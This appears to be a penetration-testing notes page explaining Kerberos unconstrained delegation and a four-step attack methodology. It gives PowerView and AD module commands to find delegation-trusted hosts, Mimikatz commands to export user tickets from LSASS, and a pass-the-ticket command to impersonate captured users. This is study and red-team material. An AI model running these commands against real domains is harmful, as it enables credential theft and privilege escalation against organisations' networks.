---
description: Unconstrained Delegation
---

# Unconstrained Delegation

### Delegation Concept

* Keberos delegation allows to reuse the end-user credentials to access resources hosted on a different server.
* Also called 2 hop authentication.
* 1st hop must have the capability to request resources from the 2nd hop impersonating that user.

***

### Unconstrained Delegation

> Unconstrained Delegation occurs when the fuser connects to the first hop and it can impersonate that user to authenticate to any resource in the domain.

**Technical details:**

* Once the user sends the TGS to the service, the user TGT is embeeded inside that TGS (because the unconstrained delegation is enabled). The first hop decrypts that TGS and uses the user's TGT to request a TGS for the 2nd hop.
* The KDC only checks if the user is marked as "sensitive".
* The TGT is extracted and stored in the LSASS process of the 1st hop.
* \*\*If we compromise the 1st hop (with uncontrained delegation), we can extract the TGTs from the users that connects to that machine.

***

## Methodology

### 1. Discover domain computers which have unconstrained delegation

```bash
#PowerView:
Get-NetComputer -UnConstrained

#ADModule:
Get-ADComputer -Filter {TrustedForDelegation -eq $True} #Machines
Get-ADUser -Filter {TrustedForDelegation -eq $True} #Users

#Output note: DC always shows, ignore this.
```

### 2. Compromise the machine

When we identify such a machine (previous step), we need to compromise the server and then extract the tickets from the LSASS process.

```bash
#Remember to create a directroy first
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

### 3. Identify accounts

Hope for high privileged users.

```bash
ls | select name #Username is behind the "@"
```

### 4. Use PassTheTicket (PTT) to inject the TGT of the user in the memory of our remote PS process.

{% code overflow="wrap" %}
```bash
Invoke-Mimikatz -Command '"kerberos::ptt $TICKET.KIRBI"' #We have to be in the same directory where the ticket is stored. The name of the ticket is complete, including the initial [xxxx]
```
{% endcode %}
